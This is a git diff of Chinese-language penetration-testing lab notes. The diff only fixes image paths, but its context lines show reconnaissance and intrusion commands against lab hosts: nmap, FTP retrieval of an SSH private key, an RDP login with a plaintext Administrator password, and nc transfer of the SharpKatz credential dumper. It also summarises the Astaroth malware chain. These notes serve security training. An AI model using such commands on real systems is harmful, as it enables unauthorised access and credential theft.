@@ -424,20 +424,20 @@ python3 ReconSpider.py http://inlanefreight.com
 nmap -p- 10.129.180.203 -T4
 ```
 
-<img src="\image-20250506151337800.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506151337800.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ```
 nmap -p 21,22,53,2121 -sCV -A -O 10.129.180.203  
 ```
 
-<img src="\image-20250506151633677.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506151633677.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ```
 ftp 10.129.180.203 2121
 ls -al
 ```
 
-<img src="\image-20250506152053363.png" alt="image-20250506152053363" style="zoom:50%;" />
+<img src=".\pictures\image-20250506152053363.png" alt="image-20250506152053363" style="zoom:50%;" />
 
 ```
 cd .ssh
@@ -446,7 +446,7 @@ chmod 600 id_rsa
 ssh ceil@10.129.180.203 -i id_rsa
 ```
 
-<img src="\image-20250506152709012.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506152709012.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ## footprinter lab medium——NFS+SMB+密码复用
 
@@ -454,7 +454,7 @@ ssh ceil@10.129.180.203 -i id_rsa
 nmap 10.129.202.41 #扫描主机常见的1000个端口
 ```
 
-<img src="\image-20250506154503704.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506154503704.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 
 
@@ -462,13 +462,13 @@ nmap 10.129.202.41 #扫描主机常见的1000个端口
 nmap -p 111,135,139,445,2049,3389 -sCV -A -O 10.129.202.41  
 ```
 
-<img src="\image-20250506155153883.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506155153883.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ```
 showmount -e 10.129.202.41
 ```
 
-<img src="\image-20250506155616246.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506155616246.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ```
 mkdir targer-NFS
@@ -477,13 +477,13 @@ cd ./targer-NFS/
 ls -al
 ```
 
-<img src="\image-20250506155914126.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506155914126.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ```
 cat ticket4238791283782.txt
 ```
 
-<img src="\image-20250506160015249.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\image-20250506160015249.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ```
 killall openvpn #先把所有vpn杀掉
@@ -499,7 +499,7 @@ smbclient -U alex \\\\10.129.141.255\\devshare
 xfreerdp /timeout:60000 /v:10.129.141.255 /u:Administrator /p:'87N1ns@slls83' /cert:ignore /d:WINMEDIUM /dynamic-resolution
 ```
 
-<img src="\783ABCEE-3E44-45ba-A516-6FDDC3D934E2.png" alt="image-20250506151633677" style="zoom:50%;" />
+<img src=".\pictures\783ABCEE-3E44-45ba-A516-6FDDC3D934E2.png" alt="image-20250506151633677" style="zoom:50%;" />
 
 ## footprinter lab hard
 
@@ -558,7 +558,7 @@ nmap -p 53231 -sV 94.237.49.101
 gobuster vhost -u http://web1337.inlanefreight.htb:31591 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 50 -k
 ```
 
-<img src="\image-20250512154801344.png" alt="image-20250512154801344.png" style="zoom:50%;" />
+<img src=".\pictures\image-20250512154801344.png" alt="image-20250512154801344.png" style="zoom:50%;" />
 
 # 钓鱼邮件甄别
 
@@ -604,7 +604,7 @@ The `Astaroth attack` generally followed these steps: A malicious link in a spea
 
 All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process.
 
-<img src="\image-20250513104915703.png" alt="image-20250513104915703" style="zoom:50%;" />
+<img src=".\pictures\image-20250513104915703.png" alt="image-20250513104915703" style="zoom:50%;" />
 
 # 五、文件传输
 
@@ -834,7 +834,7 @@ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 或ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
 
-<img src="\image-20250515101304582.png" alt="image-20250515101304582" style="zoom:50%;" />
+<img src=".\pictures\image-20250515101304582.png" alt="image-20250515101304582" style="zoom:50%;" />
 
 如果防火墙限制了入站，不适用。
 
